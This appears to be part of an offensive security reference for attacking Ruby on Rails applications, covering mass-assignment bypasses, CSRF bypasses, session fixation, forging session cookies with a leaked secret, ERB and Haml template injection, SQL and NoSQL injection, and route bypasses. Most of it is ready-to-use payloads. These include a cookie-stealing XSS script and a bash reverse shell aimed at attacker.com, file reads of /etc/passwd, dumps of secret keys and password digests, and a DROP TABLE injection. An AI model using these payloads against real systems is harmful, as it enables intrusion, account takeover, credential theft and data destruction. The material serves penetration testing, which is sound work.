<strong_parameters_bypass>
<common_patterns>
{% raw %}
# Strong parameters with permit

# Safe:
def user_params
  params.require(:user).permit(:email, :password)
end

# Vulnerable patterns:

# 1. permit! (allows all)
def user_params
  params.require(:user).permit!
end

# 2. Empty permit (allows nested)
def user_params
  params.permit(:user)[:user]
end

# 3. Overly permissive arrays
def user_params
  params.require(:user).permit!.except(:role)
end

# 4. Conditional permits
def user_params
  if current_user.admin?
    params.require(:user).permit!
  else
    params.require(:user).permit(:email)
  end
end
# Test as admin to find all permissible fields
{% endraw %}
</common_patterns>

<testing_approach>
{% raw %}
# Enumerate allowed parameters

# Try various fields:
fields = ["role", "admin", "is_admin", "balance", "verified", 
          "status", "type", "parent_id", "group_id"]

for field in fields:
    POST /users
    {
      "user": {
        "email": "test@example.com",
        "password": "pass123",
        field: test_value
      }
    }
    # Check response for errors or success

# Pay attention to error messages:
# "Unpermitted parameter: role" -> blocked
# No error -> may be accepted

# Verify if field was set:
# Check profile/API response
GET /users/123
# Look for injected field in response
{% endraw %}
</testing_approach>

<nested_attributes>
{% raw %}
# accepts_nested_attributes_for

# Model:
class User < ApplicationRecord
  has_one :profile
  accepts_nested_attributes_for :profile
end

# Attack via nested attributes:
{
  "user": {
    "email": "test@example.com",
    "profile_attributes": {
      "bio": "Hello",
      "admin": true,  // Inject into profile
      "user_id": 456  // Change association
    }
  }
}

# Or with has_many:
{
  "user": {
    "posts_attributes": [
      {
        "title": "Post 1",
        "author_id": 999  // Inject author
      }
    ]
  }
}

# Destroy via nested:
{
  "user": {
    "profile_attributes": {
      "id": 123,
      "_destroy": true  // Delete profile
    }
  }
}
{% endraw %}
</nested_attributes>
</strong_parameters_bypass>

<csrf_vulnerabilities>
<token_prediction>
{% raw %}
# Rails CSRF token structure

# Old Rails (< 5.2):
# Token = Base64(Random bytes)
# Stored in session, compared directly

# Rails 5.2+:
# Token = Base64(Random bytes XOR session_id)
# More secure, per-session

# Attack old versions:
# If token generation is weak:
# Predict or brute-force token

# Check token in form:
<input type="hidden" name="authenticity_token" value="abc123...">

# Test reuse:
# Extract token from one session
# Try in different session
{% endraw %}
</token_prediction>

<bypass_techniques>
{% raw %}
# CSRF protection bypass

# 1. Missing verification:
# Check if POST/PUT/DELETE without token succeed

POST /users/123
Content-Type: application/json
{"user": {"role": "admin"}}
# No authenticity_token

# 2. Content-Type bypass:
# Rails may skip CSRF for API-like requests
Content-Type: application/json
# vs
Content-Type: application/x-www-form-urlencoded

# 3. Null token:
authenticity_token=null

# 4. Empty token:
authenticity_token=

# 5. Method override:
POST /users/123?_method=DELETE
# If CSRF only checked on DELETE

# 6. Header vs parameter:
# Some configs check X-CSRF-Token header
# Others check authenticity_token param
# Test both

# 7. API endpoints without CSRF:
# /api/* routes may not enforce CSRF
POST /api/users/123
{"role": "admin"}

# 8. Origin header manipulation:
Origin: https://trusted-site.com
# If server validates Origin instead of token
{% endraw %}
</bypass_techniques>

<token_reuse>
{% raw %}
# Test token reuse across sessions

# Session A's form:
<input name="authenticity_token" value="token_A">

# Try token_A in Session B:
POST /users (Session B)
authenticity_token=token_A

# Expected: Rejected
# Actual (vulnerable): Accepted

# Or across users:
# User A's token used by User B
# If token not tied to session properly
{% endraw %}
</token_reuse>
</csrf_vulnerabilities>

<session_attacks>
<session_fixation>
{% raw %}
# Force victim to use attacker's session

# Rails session in cookie (default):
Cookie: _myapp_session=abc123

# Attack:
# 1. Get valid session ID
# 2. Victim uses that session (via URL or cookie injection)
# 3. Victim logs in
# 4. Attacker's session now authenticated

# Test:
# 1. Create session as attacker
# 2. Extract _myapp_session cookie value
# 3. Set that cookie for victim user
# 4. Victim logs in
# 5. Attacker uses same session -> authenticated

# Mitigation check:
# Rails should reset session on login
# Check if session ID changes after authentication
{% endraw %}
</session_fixation>

<session_hijacking>
{% raw %}
# Steal or guess session tokens

# Rails session storage:
# - Cookie (encrypted) - default
# - Redis
# - ActiveRecord (database)
# - Memcache

# Cookie-based (CookieStore):
Cookie: _myapp_session=<encrypted_data>

# Attack 1: Decrypt cookie
# If secret_key_base is leaked:
# Decrypt session cookie
# Read/modify session data

# Finding secret_key_base:
# - config/secrets.yml
# - config/credentials.yml.enc (needs master.key)
# - Environment variables
# - Git history
# - Error messages

# Attack 2: Brute-force weak secret:
# If secret_key_base is weak/default

# Attack 3: Session fixation (above)

# Attack 4: XSS to steal cookie
# If HTTPOnly not set:
<script>document.location='http://attacker.com/?c='+document.cookie</script>
{% endraw %}
</session_hijacking>

<cookie_tampering>
{% raw %}
# Tamper with session cookie

# If secret_key_base known:
# Decrypt, modify, re-encrypt cookie

# Ruby code:
require 'cgi'
require 'active_support'

cookie_value = '_myapp_session=...'
secret = 'leaked_secret_key_base'

# Decrypt:
verifier = ActiveSupport::MessageVerifier.new(secret)
session_data = verifier.verify(CGI.unescape(cookie_value))

# Modify:
session_data['user_id'] = 999  # Admin user
session_data['role'] = 'admin'

# Re-encrypt:
new_cookie = verifier.generate(session_data)

# Use new_cookie in requests
{% endraw %}
</cookie_tampering>
</session_attacks>

<template_injection>
<erb_injection>
{% raw %}
# ERB (Embedded Ruby) template injection

# Vulnerable code:
# Direct rendering of user input
render inline: params[:template]
render inline: "Hello #{params[:name]}"

# Attack payloads:
# Basic execution:
<%= system('id') %>
<%= `whoami` %>

# Read file:
<%= File.read('/etc/passwd') %>
<%= IO.read('/etc/passwd') %>

# Code execution:
<%= eval('`id`') %>
<%= exec('cat /etc/passwd') %>

# Module methods:
<%= File.open('/etc/passwd').read %>
<%= Dir.entries('/') %>

# Rails helpers:
<%= Rails.env %>
<%= Rails.root %>
<%= Rails.application.secrets.secret_key_base %>

# ActiveRecord:
<%= User.count %>
<%= User.all.to_json %>
<%= User.first.password_digest %>

# Reverse shell:
<%= `bash -i >& /dev/tcp/attacker.com/4444 0>&1` %>
{% endraw %}
</erb_injection>

<haml_injection>
{% raw %}
# Haml template injection

# Vulnerable:
render inline: params[:template], type: :haml

# Attack payloads:
# Basic:
= system('id')
= `whoami`

# Code execution:
= eval('`id`')

# File read:
= File.read('/etc/passwd')

# Rails-specific:
= Rails.application.secrets.secret_key_base
= User.first.attributes
{% endraw %}
</haml_injection>

<detection>
{% raw %}
# Find template injection

# Test for reflection:
# Input: {{7*7}}
# Output: 49 (vulnerable)
# or {{7*7}} (safe)

# Input: <%= 7*7 %>
# Output: 49 (ERB injection)

# Input: #{ 7*7 }
# Output: 49 (Ruby string interpolation)

# Common injection points:
# - Search queries
# - Email templates
# - PDF generation
# - Custom pages/widgets
# - Error messages

# Test URL:
GET /search?q=<%= 7*7 %>
# Or:
POST /render
{"template": "<%= 7*7 %>"}
{% endraw %}
</detection>
</template_injection>

<activerecord_injection>
<sql_injection>
{% raw %}
# SQL injection in ActiveRecord

# Vulnerable patterns:

# 1. String interpolation:
User.where("email = '#{params[:email]}'")
# Attack: params[:email] = "' OR '1'='1"

# 2. Raw SQL:
User.find_by_sql("SELECT * FROM users WHERE email = '#{email}'")

# 3. Pluck/select with interpolation:
User.pluck("email, #{params[:field]}")
# Attack: params[:field] = "password_digest"

# 4. Order clause:
User.order(params[:sort])
# Attack: params[:sort] = "id DESC; DROP TABLE users--"

# 5. Group clause:
User.group(params[:group_by])

# 6. Having clause:
User.having("#{params[:condition]}")

# Safe alternatives:
# Use parameterized queries:
User.where("email = ?", params[:email])
User.where(email: params[:email])
{% endraw %}
</sql_injection>

<nosql_injection>
{% raw %}
# NoSQL injection (MongoDB with Mongoid)

# Vulnerable:
User.where(params[:query])

# Attack:
POST /search
{
  "query": {
    "$ne": null
  }
}
# Returns all users

# Or:
{
  "query": {
    "role": {"$ne": "admin"},
    "$or": [{"role": "admin"}]
  }
}

# Injection in authentication:
{
  "user": {
    "email": {"$ne": null},
    "password": {"$ne": null}
  }
}
# Bypasses authentication
{% endraw %}
</nosql_injection>

<order_by_injection>
{% raw %}
# ORDER BY injection

# Vulnerable:
@users = User.order(params[:sort])

# Attack 1: Change sort order:
params[:sort] = "created_at DESC"
params[:sort] = "role ASC"  // Enumerate roles

# Attack 2: Blind SQL injection:
params[:sort] = "id AND (SELECT SLEEP(5))--"
# If delays 5 seconds -> SQLi confirmed

# Attack 3: Column enumeration:
params[:sort] = "invalid_column"
# Error reveals table structure

# Attack 4: Union-based:
params[:sort] = "id UNION SELECT password_digest FROM users--"

# Safe:
ALLOWED_SORTS = ['created_at', 'email', 'name']
sort = ALLOWED_SORTS.include?(params[:sort]) ? params[:sort] : 'created_at'
User.order(sort)
{% endraw %}
</order_by_injection>
</activerecord_injection>

<route_manipulation>
<route_constraints>
{% raw %}
# Rails routes with constraints

# routes.rb:
get '/admin', to: 'admin#index', constraints: { ip: /127\.0\.0\.1/ }

# Attack: X-Forwarded-For header
GET /admin
X-Forwarded-For: 127.0.0.1

# If constraint checks X-Forwarded-For instead of remote IP

# Or:
get '/api/users', constraints: { format: 'json' }
# Bypass by adding .json extension:
GET /api/users.json
{% endraw %}
</route_constraints>

<format_bypass>
{% raw %}
# Format-specific routes

# Respond only to JSON:
respond_to do |format|
  format.json { render json: @users }
end

# Attack: Add .json to URL
GET /admin/users.json
# May bypass HTML-only authentication

# Or content-type negotiation:
GET /admin/users
Accept: application/json
{% endraw %}
</format_bypass>

<namespace_bypass>
{% raw %}
# Namespaced routes

# routes.rb:
namespace :admin do
  resources :users
end

# Routes:
# /admin/users

# Attack: Double-check authorization
# Admin namespace but no admin check in controller

# Test:
GET /admin/users (as regular user)
# Expected: Forbidden
# Actual (vulnerable): Returns data
{% endraw %}
</namespace_bypass>
</route_manipulation>

